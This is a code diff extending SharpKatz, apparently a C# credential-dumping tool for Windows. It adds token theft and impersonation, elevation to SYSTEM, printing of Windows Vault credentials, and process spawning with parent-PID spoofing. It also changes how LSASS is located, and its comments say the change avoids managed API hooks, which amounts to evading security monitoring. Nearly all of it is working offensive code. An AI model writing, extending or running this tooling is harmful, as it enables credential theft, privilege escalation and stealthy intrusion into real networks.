@@ -53,11 +53,15 @@ namespace SharpKatz
             string library = null;
             string system = null;
             string sam = null;
+            string pid = null;
+            string password = null;
+            string parentpid = null;
+            string parentname = null;
             bool showhelp = false;
 
             OptionSet opts = new OptionSet()
             {
-                { "Command=", "--Command logonpasswords,ekeys,msv,kerberos,tspkg,credman,wdigest,dcsync,zerologon,printnightmare", v => command = v },
+                { "Command=", "--Command logonpasswords,ekeys,msv,kerberos,tspkg,credman,wdigest,dcsync,zerologon,printnightmare,token,vault,spawn", v => command = v },
                 { "User=", "--User [user]", v => user = v },
                 { "Guid=", "--Guid [guid]", v => guid = v },
                 { "Domain=", "--Domain [domain]", v => domain = v },
@@ -87,6 +91,11 @@ namespace SharpKatz
 
                 { "System=", "--System [systempath]", v => system = v },
                 { "Sam=", "--Sam [sampath]", v => sam = v },
+
+                { "Pid=", "--Pid [pid]", v => pid = v },
+                { "Password=", "--Password [password]", v => password = v },
+                { "ParentPid=", "--ParentPid [parentpid]", v => parentpid = v },
+                { "ParentName=", "--ParentName [parentname]", v => parentname = v },
 
                 { "Altservice=", "--Altservice [alternative service]", v => altservice = v },
                 { "h|?|help",  "Show available options", v => showhelp = v != null },
@@ -160,6 +169,15 @@ namespace SharpKatz
                 Console.WriteLine("  Example: --Command hivenightmare");
                 Console.WriteLine("  Example: --Command dumpsam --System <system_path> --Sam <sam_path>");
                 Console.WriteLine("  Example: --Command listshadows");
+                Console.WriteLine("  Example: --Command token --Mode list");
+                Console.WriteLine("  Example: --Command token --Mode steal --Pid 1234");
+                Console.WriteLine("  Example: --Command token --Mode make --User admin --Domain CORP --Password pass123");
+                Console.WriteLine("  Example: --Command token --Mode elevate");
+                Console.WriteLine("  Example: --Command token --Mode revert");
+                Console.WriteLine("  Example: --Command vault");
+                Console.WriteLine("  Example: --Command spawn --Binary C:\\Windows\\System32\\cmd.exe");
+                Console.WriteLine("  Example: --Command spawn --Binary cmd.exe --ParentPid 1234");
+                Console.WriteLine("  Example: --Command spawn --Binary cmd.exe --ParentName svchost");
                 return;
             }
 
@@ -168,7 +186,9 @@ namespace SharpKatz
 
             if (!command.Equals("logonpasswords") && !command.Equals("msv") && !command.Equals("kerberos") && !command.Equals("credman") &&
                 !command.Equals("tspkg") && !command.Equals("wdigest") && !command.Equals("ekeys") && !command.Equals("dcsync") &&
-                !command.Equals("pth") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") && !command.Equals("listshadows") && !command.Equals("dumpsam")) 
+                !command.Equals("pth") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") &&
+                !command.Equals("listshadows") && !command.Equals("dumpsam") &&
+                !command.Equals("token") && !command.Equals("vault") && !command.Equals("spawn"))
             {
                 Console.WriteLine("Unknown command");
                 return;
@@ -189,6 +209,90 @@ namespace SharpKatz
                 return;
             }
 
+            // --- Commands that do NOT need LSASS ---
+
+            if (command.Equals("token"))
+            {
+                if (string.IsNullOrEmpty(mode))
+                    mode = "list";
+
+                switch (mode)
+                {
+                    case "list":
+                        var tokens = Module.Token.ListTokens();
+                        Console.WriteLine("\n  Available tokens ({0} unique):\n", tokens.Count);
+                        foreach (var t in tokens)
+                        {
+                            Console.WriteLine("    PID {0,-6} {1,-20} {2}\\{3} {4}",
+                                t.ProcessId, t.ProcessName, t.Domain, t.Username,
+                                t.IsElevated ? "[ELEVATED]" : "");
+                        }
+                        break;
+
+                    case "steal":
+                        if (string.IsNullOrEmpty(pid) || !int.TryParse(pid, out int stealPid))
+                        {
+                            Console.WriteLine("   Missing or invalid parameter -> Pid");
+                            return;
+                        }
+                        Module.Token.StealToken(stealPid);
+                        break;
+
+                    case "make":
+                        if (string.IsNullOrEmpty(user) || string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(password))
+                        {
+                            Console.WriteLine("   Missing required parameters -> User, Domain, Password");
+                            return;
+                        }
+                        Module.Token.MakeToken(domain, user, password);
+                        break;
+
+                    case "elevate":
+                        Module.Token.ElevateToSystem();
+                        break;
+
+                    case "revert":
+                        Module.Token.Revert();
+                        break;
+
+                    default:
+                        Console.WriteLine("   Invalid Mode for token. Use: list, steal, make, elevate, revert");
+                        break;
+                }
+                return;
+            }
+
+            if (command.Equals("vault"))
+            {
+                Module.Vault.PrintCredentials();
+                return;
+            }
+
+            if (command.Equals("spawn"))
+            {
+                if (string.IsNullOrEmpty(binary))
+                {
+                    binary = @"C:\Windows\System32\cmd.exe";
+                }
+
+                if (!string.IsNullOrEmpty(parentpid))
+                {
+                    if (!int.TryParse(parentpid, out int ppid))
+                    {
+                        Console.WriteLine("   Invalid ParentPid value");
+                        return;
+                    }
+                    Module.SpawnProcess.CreateWithParentSpoof(ppid, binary, arguments ?? "");
+                }
+                else
+                {
+                    Module.SpawnProcess.SpawnUnderParent(binary, arguments ?? "", parentname);
+                }
+                return;
+            }
+
+            // --- Commands that need LSASS or elevated context ---
+
             if (!command.Equals("dcsync") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") && !command.Equals("listshadows") && !command.Equals("dumpsam"))
             {
 
@@ -208,16 +312,18 @@ namespace SharpKatz
                 IntPtr lsasslive = IntPtr.Zero;
                 IntPtr hProcess = IntPtr.Zero;
 
-                // Find target process by name constructed at runtime (avoid static string)
+                // Find target process PID via syscall enumeration (avoid managed Process API hooks)
                 string targetProc = new string(new char[] { 'l', 's', 'a', 's', 's' });
-                Process[] procs = Process.GetProcessesByName(targetProc);
-                if (procs.Length == 0)
+                int targetPid = Module.SpawnProcess.FindSpoofParent(targetProc);
+                if (targetPid <= 0)
                 {
                     Console.WriteLine("Target process not found");
                     return;
                 }
-                Process plsass = procs[0];
 
+                // Module enumeration still uses managed API for base addresses
+                // (full replacement requires PEB->Ldr walk via NtQueryInformationProcess)
+                Process plsass = Process.GetProcessById(targetPid);
                 ProcessModuleCollection processModules = plsass.Modules;
                 int modulefound = 0;
 
